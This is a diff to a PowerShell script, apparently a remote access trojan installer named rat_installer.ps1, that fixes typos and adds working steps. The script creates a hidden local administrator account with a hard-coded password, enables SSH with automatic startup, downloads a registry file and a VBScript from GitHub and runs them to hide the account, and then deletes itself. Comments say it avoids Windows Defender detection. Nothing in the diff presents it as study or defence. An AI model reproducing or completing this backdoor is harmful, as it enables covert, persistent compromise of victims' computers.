@@ -6,7 +6,7 @@ function random_text{
 }
 
 # create local admin
-function Crreate-NewLocalAdmin {
+function Create-NewLocalAdmin {
     [CmdletBinding()]
     param (
         [string] $NewLocalAdmin,
@@ -39,30 +39,27 @@ $NewLocalAdmin = "WindowsGuest"
 $Password = (ConvertTo-SecureString "rat123" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
+# dont disable wdef until need to, not av detectable up until here
+
+# enabling persistent ssh
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
+
 # create registery to hide local admin
 $reg_file = random_text
 Invoke-WebRequest -Uri "https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/admin.reg" -OutFile 
-"$reg_file.reg"
+"wrev.reg"
 
 # visual basic script to register the registery
 $vbs_file = random_text
 Invoke-WebRequest -Uri "https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/confirm.vbs" -OutFile 
-"$vbs_file.vbs"
+"calty.vbs"
 
 
+# install the registry
+Invoke-Expression "./wrev.reg"; Invoke-Expression "./calty.vbs"
 
-# dont disable wdef until need to, not av detectable up until here
-
-Add-WindowsCapability -Online 
--Name OpenSSG.Server~~~~0.0.1.0
-Start-Service sshd
-Set-Service -Name sshd
--StartupTpe 'Automatic'
-
-# install the registery
-./"$reg_file.reg";"$vsb_file.vbs"
-
-pause
 # self delete
 cd $initial_dir
 del rat_installer.ps1
